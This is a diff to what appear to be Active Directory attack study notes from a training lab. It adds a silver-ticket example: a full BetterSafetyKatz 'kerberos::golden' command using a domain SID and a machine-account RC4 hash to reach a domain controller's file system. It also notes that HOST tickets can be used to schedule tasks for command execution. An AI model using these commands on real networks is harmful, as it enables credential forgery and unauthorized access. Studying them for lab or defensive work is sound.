@@ -105,9 +105,16 @@ $ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain
 
 **_Example Usage -:_**
 
+- Using hash of the Domain Controller computer account, below command provides access to file system on the DC
 
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 
+# Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more
+```
 
+- There are also various ways of achieving command execution using Silver tickets. 
+- Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:
 
 
 
